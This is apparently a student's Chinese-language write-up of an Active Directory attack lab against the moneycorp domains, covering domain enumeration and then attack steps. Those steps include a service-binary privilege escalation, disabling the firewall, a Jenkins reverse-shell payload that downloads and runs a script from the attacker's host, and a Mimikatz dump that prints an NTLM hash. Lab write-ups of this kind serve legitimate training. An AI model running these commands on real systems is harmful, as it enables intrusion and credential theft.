# Learning Objective 1:
Task
● Enumerate following for the dollarcorp domain:
− Users
− Computers
− Domain Administrators
− Enterprise Administrators
− Shares

## Users
```
PS C:\ad> Get-NetUser |select cn

cn
--
Administrator
Guest
DefaultAccount
krbtgt
ci admin
sql admin
web svc
srv admin
app admin
mgmt admin
svc admin
studentadmin
sql1 admin
test da
Control359User
Control360User
Control361User
Control362User
Control363User
Control364User
Control365User
Control366User
Control367User
Control368User
Control369User
Control370User
Support359User
Support360User
Support361User
Support362User
Support363User
Support364User
Support365User
Support366User
Support367User
Support368User
Support369User
Support370User
VPN359User
VPN360User
VPN361User
VPN362User
VPN363User
VPN364User
VPN365User
VPN366User
VPN367User
VPN368User
VPN369User
VPN370User
student359
student360
student361
student362
student363
student364
student365
student366
student367
student368
student369
student370
```

## Computers
```
PS C:\ad> Get-NetComputer
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-std360.dollarcorp.moneycorp.local
dcorp-std361.dollarcorp.moneycorp.local
dcorp-std362.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-std365.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
mcorp-std366.dollarcorp.moneycorp.local
```

## Domain Administrators
```
PS C:\ad> Get-NetGroupMember -GroupName "Domain Admins" -Recurse


GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : svcadmin
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1122
IsGroup      : False
MemberDN     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
```

## Enterprise Administrators

Enterprise Admins在父域，搜索的时候要指定父域，不然搜索不到

```
PS C:\ad> Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local


GroupDomain  : moneycorp.local
GroupName    : Enterprise Admins
MemberDomain : moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-280534878-1496970234-700767426-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=moneycorp,DC=local

```

## Shares
```
PS C:\ad> Invoke-FileFinder


FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local
Owner          : BUILTIN\Administrators
LastAccessTime : 2/16/2019 11:00:05 PM
LastWriteTime  : 2/16/2019 11:00:05 PM
CreationTime   : 2/16/2019 11:00:05 PM
Length         :

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\DfsrPrivate
Owner          : NT AUTHORITY\SYSTEM
LastAccessTime : 2/16/2019 11:07:26 PM
LastWriteTime  : 2/16/2019 11:07:26 PM
CreationTime   : 2/16/2019 11:07:26 PM
Length         :

FullName       : \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL\dollarcorp.moneycorp.local\Policies
Owner          : BUILTIN\Administrators
LastAccessTime : 2/18/2019 11:04:25 PM
LastWriteTime  : 2/18/2019 11:04:25 PM
CreationTime   : 2/16/2019 11:00:17 PM
Length         :

<略>
```


# Learning Objective 2:
Task
● Enumerate following for the dollarcorp domain:
− List all the OUs
− List all the computers in the StudentMachines OU.
− List the GPOs
− Enumerate GPO applied on the StudentMachines OU.

## List all the OUs
```
PS C:\ad> Get-NetOU
LDAP://OU=Domain Controllers,DC=dollarcorp,DC=moneycorp,DC=lo
LDAP://OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
LDAP://OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
LDAP://OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
```

## List all the computers in the StudentMachines OU.

```
PS C:\ad>  Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-std360.dollarcorp.moneycorp.local
dcorp-std361.dollarcorp.moneycorp.local
dcorp-std362.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-std365.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
```

## List the GPOs
```
PS C:\ad> Get-NetGPO


usncreated               : 8016
systemflags              : -1946157056
displayname              : Default Domain Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
whenchanged              : 2/17/2019 7:14:30 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 13009
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}
adspath                  : LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\dollarcorp.moneycorp.local\sysvol\dollarcorp.moneycorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/17/2019 7:00:13 AM
versionnumber            : 3
instancetype             : 4
objectguid               : cd0c7024-e03a-4369-958b-9c93fbd25649
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

usncreated               : 8019
systemflags              : -1946157056
displayname              : Default Domain Controllers Policy
gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 2/18/2019 11:09:29 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 39159
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}
adspath                  : LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\dollarcorp.moneycorp.local\sysvol\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/17/2019 7:00:13 AM
versionnumber            : 3
instancetype             : 4
objectguid               : 800516c0-1d9d-4cc6-aeae-7b30fae46799
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

usncreated               : 14716
displayname              : Applocker
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{62C1845D-C4A6-4ACB-BBB0-C895FD090385}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:21:07 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123116
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {211A25B2-03AD-4E5E-9C6A-AFEFE66EFB2D}
adspath                  : LDAP://CN={211A25B2-03AD-4E5E-9C6A-AFEFE66EFB2D},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {211A25B2-03AD-4E5E-9C6A-AFEFE66EFB2D}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB2D}
distinguishedname        : CN={211A25B2-03AD-4E5E-9C6A-AFEFE66EFB2D},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/17/2019 1:44:15 PM
versionnumber            : 21
instancetype             : 4
objectguid               : 06b004fe-5da8-4765-83c6-595fd1af5bcf
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

usncreated               : 65523
displayname              : Servers
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:21:47 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123130
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {C4F31C31-6258-4991-AAAD-454934E882AE}
adspath                  : LDAP://CN={C4F31C31-6258-4991-AAAD-454934E882AE},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {C4F31C31-6258-4991-AAAD-454934E882AE}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882AE}
distinguishedname        : CN={C4F31C31-6258-4991-AAAD-454934E882AE},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/19/2019 6:53:55 AM
versionnumber            : 10
instancetype             : 4
objectguid               : 85432932-9ec6-47ea-9709-92ad11bd3e89
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

usncreated               : 65831
displayname              : Students
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:22:16 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123144
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
adspath                  : LDAP://CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
distinguishedname        : CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/19/2019 7:04:25 AM
versionnumber            : 8
instancetype             : 4
objectguid               : 8ecdfe44-b617-4b9e-a9f9-4d548e5dc7b1
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

##  Enumerate GPO applied on the StudentMachines OU

这里分两步

先获取StudentMachines里OU值里的gplink这个字段的值
```
PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
[LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
```

以上面的gplink作为传入参数，查询符合这个条件的所有GPO
```
PS C:\ad> Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'


usncreated               : 65831
displayname              : Students
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:22:16 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123144
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
adspath                  : LDAP://CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
distinguishedname        : CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/19/2019 7:04:25 AM
versionnumber            : 8
instancetype             : 4
objectguid               : 8ecdfe44-b617-4b9e-a9f9-4d548e5dc7b1
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

# Learning Objective 3:
Task
● Enumerate following for the dollarcorp domain:
− ACL for the Users group
− ACL for the Domain Admins group
− All modify rights/permissions for the studentx

## ACL for the Users group
```
PS C:\ad> Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Schema,CN=Configuration,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Extended-Rights,CN=Configuration,DC=moneycorp,DC=local


InheritedObjectType   : All
ObjectDN              : CN=Users,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-32-545

InheritedObjectType   : All
ObjectDN              : CN=Users,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-32-545
<略>
```

## ACL for the Domain Admins group

```
PS C:\ad> Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Schema,CN=Configuration,DC=moneycorp,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://CN=Extended-Rights,CN=Configuration,DC=moneycorp,DC=local


InheritedObjectType   : All
ObjectDN              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-512

InheritedObjectType   : All
ObjectDN              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\SYSTEM
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-512
```

##  All modify rights/permissions for the studentx

枚举用户sudent366所有modify权限
```
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "sudent366"}
```

枚举用户组RDPUsers的所有modify权限
```
PS C:\ad> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}


InheritedObjectType   : All
ObjectDN              : CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : dcorp\RDPUsers
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-45101
IdentitySID           : S-1-5-21-1874506631-3219952063-538504511-1116

InheritedObjectType   : All
ObjectDN              : CN=Control360User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : dcorp\RDPUsers
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-45102
IdentitySID           : S-1-5-21-1874506631-3219952063-538504511-1116
```


# Learning Objective 4:
Task
● Enumerate all domains in the moneycorp.local forest.
● Map the trusts of the dollarcorp.moneycorp.local domain.
● Map External trusts in moneycorp.local forest.
● Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?


## Enumerate all domains in the moneycorp.local forest

```
PS C:\ad> Get-NetForestDomain -Forest  moneycorp.local


Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
Children                : {us.dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
Name                    : dollarcorp.moneycorp.local

Forest                  : moneycorp.local
DomainControllers       : {mcorp-dc.moneycorp.local}
Children                : {dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : mcorp-dc.moneycorp.local
RidRoleOwner            : mcorp-dc.moneycorp.local
InfrastructureRoleOwner : mcorp-dc.moneycorp.local
Name                    : moneycorp.local

Forest                  :
DomainControllers       :
Children                :
DomainMode              :
DomainModeLevel         :
Parent                  :
PdcRoleOwner            :
RidRoleOwner            :
InfrastructureRoleOwner :
Name                    : us.dollarcorp.moneycorp.local

```

## Map the trusts of the dollarcorp.moneycorp.local domain.
```
PS C:\ad> Get-NetDomainTrust -Domain dollarcorp.moneycorp.local

SourceName                 TargetName                      TrustType TrustDirection
----------                 ----------                      --------- --------------
dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional
dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
```

## Map External trusts in moneycorp.local forest.

```
PS C:\ad> Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq "External"}

SourceName                 TargetName     TrustType TrustDirection
----------                 ----------     --------- --------------
dollarcorp.moneycorp.local eurocorp.local  External  Bidirectional
```

## Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?

注意上面dollarcorp.moneycorp.local和eurocorp.local的信任关系是Bidirectional（双向）的，所以我们可以从eurocorp.local里提取信息

```
PS C:\ad> Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust

SourceName     TargetName                   TrustType TrustDirection
----------     ----------                   --------- --------------
eurocorp.local eu.eurocorp.local          ParentChild  Bidirectional
eurocorp.local dollarcorp.moneycorp.local    External  Bidirectional
```


# Learning Objective 5:
Task
● Exploit a service on dcorp-studentx and elevate privileges to local administrator.
● Identify a machine in the domain where studentx has local administrative access.
● Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server.


## Exploit a service on dcorp-studentx and elevate privileges to local administrator.

使用powerup

枚举没有用引号括起来的路径服务
```

PS C:\ad> Get-ServiceUnquoted


ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\WebServer\abyssws.exe --service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True

```

写一个提权的exe，指定当前账号
```
PS C:\ad> Write-ServiceBinary -Name 'Abyss.exe' -Path 'C:\WebServer\Abyss.exe' -UserName 'dcorp\student366'

ServiceName Path                   Command
----------- ----                   -------
            C:\WebServer\Abyss.exe net localgroup Administrators dcorp\student366 /add


PS C:\ad> ls C:\WebServer\


    Directory: C:\WebServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/18/2019   4:50 AM                Abyss Web Server
-a----        2/20/2022  12:57 AM          22016 Abyss.exe
```

重启服务
```
sc.exe stop AbyssWebServer
sc.exe start AbyssWebServer
```

现在用admin权限打开一个powershell，输入当前账号密码，如果可以打开表示本地提权成功。


## Identify a machine in the domain where studentx has local administrative access.

可以横向到dcorp-adminsrv
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
mcorp-std366.dollarcorp.moneycorp.local
```

## Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server.

未登陆状态下打开```http://172.16.3.11:8080/asynchPeople/```收集到用户名

```
builduser
manager
jenkinsadmin
```
手工测试```builduser：builduser```登陆到Jenkins

### 关闭防火墙

做这一步之前一定要保证自己已经取得了本地管理员权限

获取防火墙状态
```
PS C:\ad> netsh advfirewall show currentprofile

Domain Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

关闭防火墙
```
NetSh Advfirewall set allprofiles state off
```

再次查看防火墙状态，已成功关闭
```
PS C:\ad> netsh advfirewall show currentprofile

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

### 拿到dcorp-ci的反弹shell

做这一步之前一定要已经关掉了防火墙

jenkin!这个web app在未登陆的情况下，可以通过下面页面查看有什么账号
```http://172.16.3.11:8080/asynchPeople//```

可以看到有builduser，jenkinsadmin，	manager三个账号

手动测试发现

Jenkins 登录账号信息是：
```builduser:builduser```



Jenkins特权提升，可以通过两种方法
1. 第一种是访问```http://172.16.3.11:8080/script```页面，如果当前账号拥有权限，将会被允许使用一个在线的console
2. 第二种是通过执行任务（例子页面：```http://172.16.3.11:8080/job/project0/```）,编译一段powershell反弹回来一个shell提权

powercat监听
```
PS C:\AD> . .\powercat.ps1
PS C:\AD> powercat -l -v -p 443 -t 100
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
```
因为本机装了python2，用python搭一个简单的http server

```
python -m SimpleHTTPServer 80
```

使用下面payload：
```
powershell.exe iex (iwr http://172.16.100.66/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.66 -Port 443
```

拿到了反弹shell
```
PS C:\ad> . .\powercat.ps1
PS C:\ad>  powercat -l -v -p 443 -t 1000
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [172.16.3.11] port  [tcp] accepted (source port 50568)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
Windows PowerShell running as user ciadmin on DCORP-CI
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project1>whoami
dcorp\ciadmin
PS C:\Program Files (x86)\Jenkins\workspace\project1> hostname
dcorp-ci
```

记得在shell里bypass powershell policy和AMSI

ciadmin是这台机器的本地管理员
```
PS C:\Program Files (x86)\Jenkins\workspace\project1> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
dcorp\ciadmin
dcorp\Domain Admins
The command completed successfully.
```

# Learning Objective 6:
Task
● Setup BloodHound and identify a machine where studentx has local administrative access.

可以横向到dcorp-adminsrv
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
mcorp-std366.dollarcorp.moneycorp.local
```


# Learning Objective 7:
Task
● Domain user on one of the machines has access to a server where a domain admin is logged in.
Identify:
− The domain user
− The server where the domain admin is logged in.
● Escalate privileges to Domain Admin
− Using the method above.
−  Using derivative local admin 

## The domain user。The server where the domain admin is logged in.

从BloodHound可以知道svcadmin登录过dcorp-mgmt

或者在前面的dcorp-ci使用userhunter
```
PS C:\Program Files (x86)\Jenkins\workspace\project1> iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
PS C:\Program Files (x86)\Jenkins\workspace\project1> invoke-userhunter

UserDomain      : dcorp
UserName        : svcadmin
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      :
```

## Using derivative local admin

查看ciadmin可以横向的电脑
```
PS C:\Program Files (x86)\Jenkins\workspace\project1> Find-LocalAdminAccess
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
```

导出ciadmin的哈希
```
PS C:\Program Files (x86)\Jenkins\workspace\project1> iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
PS C:\Program Files (x86)\Jenkins\workspace\project1> Invoke-Mimikatz

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 65288 (00000000:0000ff08)
Session           : Service from 0
User Name         : ciadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:41:27 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1109
        msv :
         [00000003] Primary
         * Username : ciadmin
         * Domain   : dcorp
         * NTLM     : e08253add90dccf1a208523d02998c3d
         * SHA1     : f668208e94aec0980d3fd18044e3e64908fe9b03
